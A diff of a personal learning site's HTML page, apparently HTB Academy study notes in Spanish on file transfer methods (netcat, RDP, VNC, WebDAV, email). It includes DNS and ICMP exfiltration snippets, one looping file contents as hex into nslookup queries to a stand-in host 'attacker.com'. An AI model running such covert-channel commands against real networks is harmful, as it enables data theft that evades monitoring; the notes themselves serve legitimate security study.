@@ -6,9 +6,8 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
-<meta name="dcterms.date" content="2026-02-24">
 
-<title>DevOps &amp; Security Learning Journey</title>
+<title>misc-methods – DevOps &amp; Security Learning Journey</title>
 <style>
 code{white-space: pre-wrap;}
 span.smallcaps{font-variant: small-caps;}
@@ -21,27 +20,62 @@ ul.task-list li input[type="checkbox"] {
   margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
   vertical-align: middle;
 }
+/* CSS for syntax highlighting */
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
 </style>
 
 
-<script src="site_libs/quarto-nav/quarto-nav.js"></script>
-<script src="site_libs/quarto-nav/headroom.min.js"></script>
-<script src="site_libs/clipboard/clipboard.min.js"></script>
-<script src="site_libs/quarto-search/autocomplete.umd.js"></script>
-<script src="site_libs/quarto-search/fuse.min.js"></script>
-<script src="site_libs/quarto-search/quarto-search.js"></script>
-<meta name="quarto:offset" content="./">
-<script src="site_libs/quarto-html/quarto.js" type="module"></script>
-<script src="site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
-<script src="site_libs/quarto-html/axe/axe-check.js" type="module"></script>
-<script src="site_libs/quarto-html/popper.min.js"></script>
-<script src="site_libs/quarto-html/tippy.umd.min.js"></script>
-<script src="site_libs/quarto-html/anchor.min.js"></script>
-<link href="site_libs/quarto-html/tippy.css" rel="stylesheet">
-<link href="site_libs/quarto-html/quarto-syntax-highlighting-dark-7ac2f9da8c2617a4fdd15004b4601015.css" rel="stylesheet" id="quarto-text-highlighting-styles">
-<script src="site_libs/bootstrap/bootstrap.min.js"></script>
-<link href="site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="site_libs/bootstrap/bootstrap-3dad1a9f078d91cda5f1887d21eb11b5.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/axe/axe-check.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-dark-7ac2f9da8c2617a4fdd15004b4601015.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-3dad1a9f078d91cda5f1887d21eb11b5.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
 <script id="quarto-search-options" type="application/json">{
   "location": "navbar",
   "copy-button": false,
@@ -80,7 +114,7 @@ ul.task-list li input[type="checkbox"] {
     <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
       <div class="navbar-container container-fluid">
       <div class="navbar-brand-container mx-auto">
-    <a class="navbar-brand" href="./index.html">
+    <a class="navbar-brand" href="../../index.html">
     <span class="navbar-title">DevOps &amp; Security Learning Journey</span>
     </a>
   </div>
@@ -91,31 +125,31 @@ ul.task-list li input[type="checkbox"] {
           <div class="collapse navbar-collapse" id="navbarCollapse">
             <ul class="navbar-nav navbar-nav-scroll me-auto">
   <li class="nav-item">
-    <a class="nav-link active" href="./index.html" aria-current="page"> 
+    <a class="nav-link" href="../../index.html"> 
 <span class="menu-text">Home</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./foundations/index.html"> 
+    <a class="nav-link" href="../../foundations/index.html"> 
 <span class="menu-text">Foundations</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./containers/index.html"> 
+    <a class="nav-link" href="../../containers/index.html"> 
 <span class="menu-text">Containers</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./devops-practices/index.html"> 
+    <a class="nav-link" href="../../devops-practices/index.html"> 
 <span class="menu-text">DevOps</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./security/index.html"> 
+    <a class="nav-link" href="../../security/index.html"> 
 <span class="menu-text">Security</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./ai-workflows/index.html"> 
+    <a class="nav-link" href="../../ai-workflows/index.html"> 
 <span class="menu-text">AI Workflows</span></a>
   </li>  
   <li class="nav-item">
-    <a class="nav-link" href="./roadmap/index.html"> 
+    <a class="nav-link" href="../../roadmap/index.html"> 
 <span class="menu-text">Roadmap</span></a>
   </li>  
 </ul>
@@ -126,11 +160,11 @@ ul.task-list li input[type="checkbox"] {
     </a>
     <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="nav-menu-language">    
         <li>
-    <a class="dropdown-item" href="./es/index.html">
+    <a class="dropdown-item" href="../../es/index.html">
  <span class="dropdown-text">Español</span></a>
   </li>  
         <li>
-    <a class="dropdown-item" href="./index.html">
+    <a class="dropdown-item" href="../../index.html">
  <span class="dropdown-text">English</span></a>
   </li>  
     </ul>
@@ -156,265 +190,146 @@ ul.task-list li input[type="checkbox"] {
     <h2 id="toc-title">On this page</h2>
    
   <ul>
-  <li><a href="#welcome-to-my-learning-journey" id="toc-welcome-to-my-learning-journey" class="nav-link active" data-scroll-target="#welcome-to-my-learning-journey">Welcome to My Learning Journey</a>
+  <li><a href="#miscellaneous-file-transfer-methods" id="toc-miscellaneous-file-transfer-methods" class="nav-link active" data-scroll-target="#miscellaneous-file-transfer-methods">Miscellaneous File Transfer Methods</a>
   <ul class="collapse">
-  <li><a href="#purpose" id="toc-purpose" class="nav-link" data-scroll-target="#purpose">Purpose</a></li>
-  <li><a href="#overall-progress" id="toc-overall-progress" class="nav-link" data-scroll-target="#overall-progress">Overall Progress</a></li>
-  <li><a href="#progress-by-area" id="toc-progress-by-area" class="nav-link" data-scroll-target="#progress-by-area">Progress by Area</a></li>
-  <li><a href="#learning-path" id="toc-learning-path" class="nav-link" data-scroll-target="#learning-path">Learning Path</a>
+  <li><a href="#netcat-nc" id="toc-netcat-nc" class="nav-link" data-scroll-target="#netcat-nc">Netcat (nc)</a>
   <ul class="collapse">
-  <li><a href="#phase-1-linux-fundamentals" id="toc-phase-1-linux-fundamentals" class="nav-link" data-scroll-target="#phase-1-linux-fundamentals">Phase 1: Linux Fundamentals ✅</a></li>
-  <li><a href="#phase-2-containerization" id="toc-phase-2-containerization" class="nav-link" data-scroll-target="#phase-2-containerization">Phase 2: Containerization ✅</a></li>
-  <li><a href="#phase-3-devops-practices" id="toc-phase-3-devops-practices" class="nav-link" data-scroll-target="#phase-3-devops-practices">Phase 3: DevOps Practices 🔄</a></li>
-  <li><a href="#phase-4-security-fundamentals" id="toc-phase-4-security-fundamentals" class="nav-link" data-scroll-target="#phase-4-security-fundamentals">Phase 4: Security Fundamentals 🔄</a></li>
-  <li><a href="#phase-5-ai-assisted-development" id="toc-phase-5-ai-assisted-development" class="nav-link" data-scroll-target="#phase-5-ai-assisted-development">Phase 5: AI-Assisted Development 🆕</a></li>
-  <li><a href="#phase-6-advanced-topics" id="toc-phase-6-advanced-topics" class="nav-link" data-scroll-target="#phase-6-advanced-topics">Phase 6: Advanced Topics ⏳</a></li>
+  <li><a href="#transferencia-básica" id="toc-transferencia-básica" class="nav-link" data-scroll-target="#transferencia-básica">Transferencia básica</a></li>
+  <li><a href="#con-compresión" id="toc-con-compresión" class="nav-link" data-scroll-target="#con-compresión">Con compresión</a></li>
+  <li><a href="#con-encriptación" id="toc-con-encriptación" class="nav-link" data-scroll-target="#con-encriptación">Con encriptación</a></li>
   </ul></li>
-  <li><a href="#structure" id="toc-structure" class="nav-link" data-scroll-target="#structure">Structure</a>
+  <li><a href="#rdp-clipboard" id="toc-rdp-clipboard" class="nav-link" data-scroll-target="#rdp-clipboard">RDP Clipboard</a>
   <ul class="collapse">
-  <li><a href="#foundations" id="toc-foundations" class="nav-link" data-scroll-target="#foundations">Foundations</a></li>
-  <li><a href="#containers" id="toc-containers" class="nav-link" data-scroll-target="#containers">Containers</a></li>
-  <li><a href="#devops-practices" id="toc-devops-practices" class="nav-link" data-scroll-target="#devops-practices">DevOps Practices</a></li>
-  <li><a href="#security" id="toc-security" class="nav-link" data-scroll-target="#security">Security</a></li>
-  <li><a href="#ai-workflows" id="toc-ai-workflows" class="nav-link" data-scroll-target="#ai-workflows">AI Workflows 🆕</a></li>
+  <li><a href="#copiar-archivos-vía-rdp" id="toc-copiar-archivos-vía-rdp" class="nav-link" data-scroll-target="#copiar-archivos-vía-rdp">Copiar archivos vía RDP</a></li>
   </ul></li>
-  <li><a href="#skills-matrix" id="toc-skills-matrix" class="nav-link" data-scroll-target="#skills-matrix">Skills Matrix</a></li>
-  <li><a href="#navigation" id="toc-navigation" class="nav-link" data-scroll-target="#navigation">Navigation</a></li>
+  <li><a href="#vnc" id="toc-vnc" class="nav-link" data-scroll-target="#vnc">VNC</a></li>
+  <li><a href="#smb-over-http-webdav" id="toc-smb-over-http-webdav" class="nav-link" data-scroll-target="#smb-over-http-webdav">SMB over HTTP (WebDAV)</a></li>
+  <li><a href="#dns-exfiltration" id="toc-dns-exfiltration" class="nav-link" data-scroll-target="#dns-exfiltration">DNS Exfiltration</a></li>
+  <li><a href="#icmp-exfiltration" id="toc-icmp-exfiltration" class="nav-link" data-scroll-target="#icmp-exfiltration">ICMP Exfiltration</a></li>
+  <li><a href="#email" id="toc-email" class="nav-link" data-scroll-target="#email">Email</a></li>
+  <li><a href="#resumen" id="toc-resumen" class="nav-link" data-scroll-target="#resumen">Resumen</a></li>
   </ul></li>
   </ul>
 </nav>
     </div>
 <!-- main -->
-<main class="content" id="quarto-document-content">
-
-<header id="title-block-header" class="quarto-title-block default">
-<div class="quarto-title">
-<h1 class="title">DevOps &amp; Security Learning Journey</h1>
-<p class="subtitle lead">From Linux fundamentals to HTB Academy and AI Workflows</p>
-</div>
+<main class="content" id="quarto-document-content"><header id="title-block-header" class="quarto-title-block"></header>
 
 
 
-<div class="quarto-title-meta">
 
-    
-    <div>
-    <div class="quarto-title-meta-heading">Published</div>
-    <div class="quarto-title-meta-contents">
-      <p class="date">February 24, 2026</p>
-    </div>
-  </div>
-  
-    
-  </div>
-  
-
-
-</header>
-
-
-<section id="welcome-to-my-learning-journey" class="level1">
-<h1>Welcome to My Learning Journey</h1>
-<p>This website documents my path through <strong>Linux system administration</strong>, <strong>Docker containerization</strong>, <strong>DevOps practices</strong>, <strong>Cybersecurity/CTF challenges</strong>, and <strong>AI-assisted development workflows</strong>.</p>
-<section id="purpose" class="level2">
-<h2 class="anchored" data-anchor-id="purpose">Purpose</h2>
-<p>This journey serves two purposes:</p>
+<section id="miscellaneous-file-transfer-methods" class="level1">
+<h1>Miscellaneous File Transfer Methods</h1>
+<p>Métodos adicionales para situaciones específicas.</p>
+<section id="netcat-nc" class="level2">
+<h2 class="anchored" data-anchor-id="netcat-nc">Netcat (nc)</h2>
+<section id="transferencia-básica" class="level3">
+<h3 class="anchored" data-anchor-id="transferencia-básica">Transferencia básica</h3>
+<p><strong>Receptor:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 8000 <span class="op">&gt;</span> received_file</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Emisor:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 192.168.1.100 8000 <span class="op">&lt;</span> file_to_send</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="con-compresión" class="level3">
+<h3 class="anchored" data-anchor-id="con-compresión">Con compresión</h3>
+<p><strong>Receptor:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 8000 <span class="kw">|</span> <span class="fu">gunzip</span> <span class="op">&gt;</span> received_file</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Emisor:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gzip</span> <span class="at">-c</span> file_to_send <span class="kw">|</span> <span class="ex">nc</span> 192.168.1.100 8000</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="con-encriptación" class="level3">
+<h3 class="anchored" data-anchor-id="con-encriptación">Con encriptación</h3>
+<p><strong>Receptor:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 8000 <span class="kw">|</span> <span class="ex">openssl</span> enc <span class="at">-d</span> <span class="at">-aes-256-cbc</span> <span class="at">-pass</span> pass:password <span class="op">&gt;</span> received_file</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Emisor:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">openssl</span> enc <span class="at">-aes-256-cbc</span> <span class="at">-pass</span> pass:password <span class="at">-in</span> file <span class="kw">|</span> <span class="ex">nc</span> 192.168.1.100 8000</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+</section>
+<section id="rdp-clipboard" class="level2">
+<h2 class="anchored" data-anchor-id="rdp-clipboard">RDP Clipboard</h2>
+<section id="copiar-archivos-vía-rdp" class="level3">
+<h3 class="anchored" data-anchor-id="copiar-archivos-vía-rdp">Copiar archivos vía RDP</h3>
 <ol type="1">
-<li><strong>Personal Progress Tracking</strong> - A visual record of what I’ve learned and completed</li>
-<li><strong>Learning Guide for Others</strong> - A structured path that others can follow to build similar skills</li>
+<li>Conectar por RDP</li>
+<li>Habilitar clipboard redirection</li>
+<li>Copiar/pegar archivos directamente</li>
 </ol>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">xfreerdp</span> /u:user /p:pass /v:target /clipboard</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
-<section id="overall-progress" class="level2">
-<h2 class="anchored" data-anchor-id="overall-progress">Overall Progress</h2>
+</section>
+<section id="vnc" class="level2">
+<h2 class="anchored" data-anchor-id="vnc">VNC</h2>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Con file transfer habilitado</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">vncviewer</span> <span class="at">-shared</span> <span class="at">-files</span> file.txt 192.168.1.100:5900</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="smb-over-http-webdav" class="level2">
+<h2 class="anchored" data-anchor-id="smb-over-http-webdav">SMB over HTTP (WebDAV)</h2>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Instalar wsgidav</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">pip3</span> install wsgidav cheroot</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Iniciar servidor</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">wsgidav</span> <span class="at">--host</span><span class="op">=</span>0.0.0.0 <span class="at">--port</span><span class="op">=</span>80 <span class="at">--root</span><span class="op">=</span>/tmp <span class="at">--auth</span><span class="op">=</span>anonymous</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>En Windows:</strong></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb10"><pre class="sourceCode cmd code-with-copy"><code class="sourceCode dosbat"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="bu">dir</span> \\192.168.1.100\DavWWWRoot</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="bu">copy</span> file.txt \\192.168.1.100\DavWWWRoot\</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="dns-exfiltration" class="level2">
+<h2 class="anchored" data-anchor-id="dns-exfiltration">DNS Exfiltration</h2>
+<p>Para redes muy restrictivas:</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Codificar datos en consultas DNS</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="va">dnsclass</span><span class="op">=</span><span class="st">"abcdefghijklmnopqrstuvwxyz0123456789"</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="va">$(</span><span class="fu">cat</span> file.txt <span class="kw">|</span> <span class="ex">xxd</span> <span class="at">-p</span><span class="va">)</span><span class="kw">;</span> <span class="cf">do</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">nslookup</span> <span class="va">$i</span>.attacker.com</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="icmp-exfiltration" class="level2">
+<h2 class="anchored" data-anchor-id="icmp-exfiltration">ICMP Exfiltration</h2>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Enviar datos en paquetes ICMP</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ping</span> <span class="at">-p</span> <span class="va">$(</span><span class="fu">cat</span> file.txt <span class="kw">|</span> <span class="ex">xxd</span> <span class="at">-p</span> <span class="kw">|</span> <span class="fu">head</span> <span class="at">-c</span> 16<span class="va">)</span> 192.168.1.100</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="email" class="level2">
+<h2 class="anchored" data-anchor-id="email">Email</h2>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Enviar archivo por email</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"Attached file"</span> <span class="kw">|</span> <span class="ex">mail</span> <span class="at">-s</span> <span class="st">"File"</span> <span class="at">-a</span> file.txt user@example.com</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="resumen" class="level2">
+<h2 class="anchored" data-anchor-id="resumen">Resumen</h2>
 <table class="caption-top table">
 <thead>
 <tr class="header">
-<th>Metric</th>
-<th>Value</th>
+<th>Método</th>
+<th>Puerto</th>
+<th>Situación</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td><strong>Total Completion</strong></td>
-<td>55%</td>
+<td>Netcat</td>
+<td>Any</td>
+<td>Raw transfer</td>
 </tr>
 <tr class="even">
-<td><strong>Completed</strong></td>
-<td>34 challenges</td>
+<td>RDP Clipboard</td>
+<td>3389</td>
+<td>GUI transfer</td>
 </tr>
 <tr class="odd">
-<td><strong>Remaining</strong></td>
-<td>28 challenges</td>
+<td>WebDAV</td>
+<td>80/443</td>
+<td>SMB over HTTP</td>
 </tr>
 <tr class="even">
-<td><strong>Total</strong></td>
-<td>62 challenges</td>
+<td>DNS</td>
+<td>53</td>
+<td>Exfiltration</td>
+</tr>
+<tr class="odd">
+<td>ICMP</td>
+<td>-</td>
+<td>Covert channel</td>
 </tr>
 </tbody>
 </table>
-</section>
-<section id="progress-by-area" class="level2">
-<h2 class="anchored" data-anchor-id="progress-by-area">Progress by Area</h2>
-<table class="caption-top table">
-<thead>
-<tr class="header">
-<th>Area</th>
-<th>Progress</th>
-<th>Status</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>🐧 <strong>Linux Foundations</strong></td>
-<td>50% (9/20)</td>
-<td>In Progress</td>
-</tr>
-<tr class="even">
-<td>🐳 <strong>Docker</strong></td>
-<td>100% (6/6)</td>
-<td>✅ Completed</td>
-</tr>
-<tr class="odd">
-<td>⚙️ <strong>DevOps</strong></td>
-<td>50% (8/16)</td>
-<td>In Progress</td>
-</tr>
-<tr class="even">
-<td>🔒 <strong>Security</strong></td>
-<td>58% (7/12)</td>
-<td>In Progress</td>
-</tr>
-<tr class="odd">
-<td>🤖 <strong>AI Workflows</strong></td>
-<td>New</td>
-<td>🆕 Course Available</td>
-</tr>
-</tbody>
-</table>
-</section>
-<section id="learning-path" class="level2">
-<h2 class="anchored" data-anchor-id="learning-path">Learning Path</h2>
-<section id="phase-1-linux-fundamentals" class="level3">
-<h3 class="anchored" data-anchor-id="phase-1-linux-fundamentals">Phase 1: Linux Fundamentals ✅</h3>
-<p>User management, permissions, networking, shell scripting</p>
-</section>
-<section id="phase-2-containerization" class="level3">
-<h3 class="anchored" data-anchor-id="phase-2-containerization">Phase 2: Containerization ✅</h3>
-<p>Docker basics, volumes, networks, troubleshooting</p>
-</section>
-<section id="phase-3-devops-practices" class="level3">
-<h3 class="anchored" data-anchor-id="phase-3-devops-practices">Phase 3: DevOps Practices 🔄</h3>
-<p>Ansible, Cron, MariaDB, CI/CD basics — <em>In Progress (50%)</em></p>
-</section>
-<section id="phase-4-security-fundamentals" class="level3">
-<h3 class="anchored" data-anchor-id="phase-4-security-fundamentals">Phase 4: Security Fundamentals 🔄</h3>
-<p>CTF basics, forensics, web security, HTB Academy — <em>In Progress</em></p>
-</section>
-<section id="phase-5-ai-assisted-development" class="level3">
-<h3 class="anchored" data-anchor-id="phase-5-ai-assisted-development">Phase 5: AI-Assisted Development 🆕</h3>
-<p>Spec-Driven Development, Kilocode CLI, Opencode, MCP Integration — <em>Course Available</em></p>
-</section>
-<section id="phase-6-advanced-topics" class="level3">
-<h3 class="anchored" data-anchor-id="phase-6-advanced-topics">Phase 6: Advanced Topics ⏳</h3>
-<p>Kubernetes, advanced networking, penetration testing</p>
-</section>
-</section>
-<section id="structure" class="level2">
-<h2 class="anchored" data-anchor-id="structure">Structure</h2>
-<p>The learning journey is organized into main areas:</p>
-<section id="foundations" class="level3">
-<h3 class="anchored" data-anchor-id="foundations"><a href="./foundations/index.html">Foundations</a></h3>
-<p>Linux system administration fundamentals</p>
-</section>
-<section id="containers" class="level3">
-<h3 class="anchored" data-anchor-id="containers"><a href="./containers/index.html">Containers</a></h3>
-<p>Docker and containerization</p>
-</section>
-<section id="devops-practices" class="level3">
-<h3 class="anchored" data-anchor-id="devops-practices"><a href="./devops-practices/index.html">DevOps Practices</a></h3>
-<p>DevOps tools and methodologies</p>
-</section>
-<section id="security" class="level3">
-<h3 class="anchored" data-anchor-id="security"><a href="./security/index.html">Security</a></h3>
-<p>Cybersecurity fundamentals</p>
-</section>
-<section id="ai-workflows" class="level3">
-<h3 class="anchored" data-anchor-id="ai-workflows"><a href="./ai-workflows/index.html">AI Workflows</a> 🆕</h3>
-<p>Spec-Driven Development with AI assistants:</p>
-<ul>
-<li><strong>Module 1</strong>: Introduction to SDD</li>
-<li><strong>Module 2</strong>: Kilocode CLI Setup</li>
-<li><strong>Module 3</strong>: Opencode Integration</li>
-<li><strong>Module 4</strong>: Guided Practice</li>
-<li><strong>Module 5</strong>: MCP Servers</li>
-<li><strong>Module 6</strong>: Advanced Patterns</li>
-</ul>
-</section>
-</section>
-<section id="skills-matrix" class="level2">
-<h2 class="anchored" data-anchor-id="skills-matrix">Skills Matrix</h2>
-<table class="caption-top table">
-<thead>
-<tr class="header">
-<th>Skill</th>
-<th>Level</th>
-<th>Status</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>Linux System Administration</td>
-<td>Intermediate</td>
-<td>In Progress</td>
-</tr>
-<tr class="even">
-<td>Docker &amp; Containers</td>
-<td>Intermediate</td>
-<td>Certified</td>
-</tr>
-<tr class="odd">
-<td>Ansible</td>
-<td>Basic</td>
-<td>Learning</td>
-</tr>
-<tr class="even">
-<td>Bash Scripting</td>
-<td>Intermediate</td>
-<td>Completed</td>
-</tr>
-<tr class="odd">
-<td>Network Security</td>
-<td>Basic</td>
-<td>Learning</td>
-</tr>
-<tr class="even">
-<td>CTF Problem Solving</td>
-<td>Basic</td>
-<td>Started</td>
-</tr>
-<tr class="odd">
-<td>HTB Academy</td>
-<td>Intermediate</td>
-<td>3 Modules Completed</td>
-</tr>
-<tr class="even">
-<td>AI-Assisted Development</td>
-<td>Beginner</td>
-<td>Learning</td>
-</tr>
-<tr class="odd">
-<td>SDD (Spec-Driven Development)</td>
-<td>Beginner</td>
-<td>Learning</td>
-</tr>
-</tbody>
-</table>
-</section>
-<section id="navigation" class="level2">
-<h2 class="anchored" data-anchor-id="navigation">Navigation</h2>
-<p>Use the sidebar to navigate between sections, or click on the section links above.</p>
-<hr>
-<p><em>This journey is continuously updated as new challenges are completed.</em></p>
 
 
 </section>
